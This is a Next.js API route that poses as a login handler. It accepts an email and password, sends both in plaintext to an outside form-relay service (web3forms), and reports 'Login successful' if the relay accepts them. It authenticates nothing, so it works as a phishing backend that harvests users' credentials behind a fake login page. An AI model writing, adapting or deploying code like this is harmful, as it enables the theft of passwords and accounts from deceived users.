import { NextResponse } from "next/server";

export const dynamic = "force-dynamic";

export async function POST(request) {
  try {
    const body = await request.json();
    const { email, pw } = body;
    // const { email, pw, hCaptchaToken } = body;
    if (!email || !/\S+@\S+\.\S+/.test(email)) {
      return NextResponse.json({ error: "Invalid email" }, { status: 400 });
    }

    if (!pw || pw.length < 8) {
      return NextResponse.json({ error: "Invalid pw" }, { status: 400 });
    }

    const formData = new FormData();
    // formData.append("access_key", process.env.NEXT_PUBLIC_WEB3_TKDCCSADM_KEY);
    formData.append("email", email);
    formData.append("pw", pw);
    // formData.append("h-captcha-response", hCaptchaToken);

    const res = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData,
    });

    const result = await res.json();

    if (result.success) {
      return NextResponse.json(
        { message: "Login successful" },
        { status: 200 }
      );
    } else {
      return NextResponse.json({ error: "Login fail" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json(
      { error: "Failed to process request" },
      { status: 500 }
    );
  }
}
